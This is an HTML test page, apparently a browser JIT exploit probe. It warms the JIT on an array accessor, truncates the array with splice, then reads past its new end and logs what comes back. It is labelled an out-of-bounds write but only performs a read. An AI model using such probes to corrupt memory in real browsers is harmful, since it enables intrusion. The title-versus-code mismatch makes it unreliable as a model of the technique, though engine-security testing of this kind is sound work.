<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Gadget - OOB Write</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      padding: 20px;
    }
    #log {
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>Gadget OOB Test</h1>
  <div id="log">Aguardando execução...</div>

  <script>
    const logElement = document.getElementById("log");
    let logData = '';

    function log(msg) {
      logData += msg + "\\n";
      logElement.textContent = logData;
    }

    function oobGadget() {
      function confuse(arr, i) {
        return arr[i];
      }

      let victim = [1.1, 2.2, 3.3, 4.4];
      for (let i = 0; i < 100000; i++) confuse(victim, 0); // aquece o JIT

      // Mutação perigosa
      victim.splice(1, 2); // corta o array

      let result = confuse(victim, 3); // fora do novo comprimento

      log("[gadget-oob] Resultado pós-splice: " + result);
    }

    setTimeout(() => {
      log("Iniciando gadget de OOB...");
      oobGadget();
      log("Finalizado.");
    }, 1500);
  </script>
</body>
</html>
